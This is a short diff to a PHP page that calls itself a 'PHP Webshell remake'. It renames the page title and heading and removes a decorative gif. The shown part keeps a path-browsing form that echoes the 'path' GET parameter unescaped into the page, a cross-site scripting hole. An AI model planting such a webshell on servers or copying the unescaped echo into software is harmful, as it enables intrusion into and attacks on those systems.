@@ -12,7 +12,7 @@ if(isset($_GET['path'])){
 
 <html>
     <head>
-        <title>Lean & Sippin'</title>
+        <title>PHP Webshell remake</title>
         <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">
         <link rel="icon" type="image/png" href="https://cdn.clipart.email/5e916fb0e7b328f9345ba0c6f8382f75_lean-purple-purplecup-codein-cup-freetoedit_240-400.png"/>
     </head>
@@ -106,11 +106,7 @@ if(isset($_GET['path'])){
     </style>
     <body>
         <div class="main">
-            <h1>Lean.v1</h1>
-            <div class="title">
-                <img src="https://media2.giphy.com/media/jJSKulIf2flL2/source.gif" width="140" height="189"/>
-                </br></br>
-            </div>
+            <h1>Webshell remake</h1>
             <form action="" method="GET">
                 <input type="text" name="path" value="<?php if(isset($_GET['path'])){ echo $_GET['path']; } if(!isset($_GET['path'])){ echo __DIR__; } ?>" />
             </form>
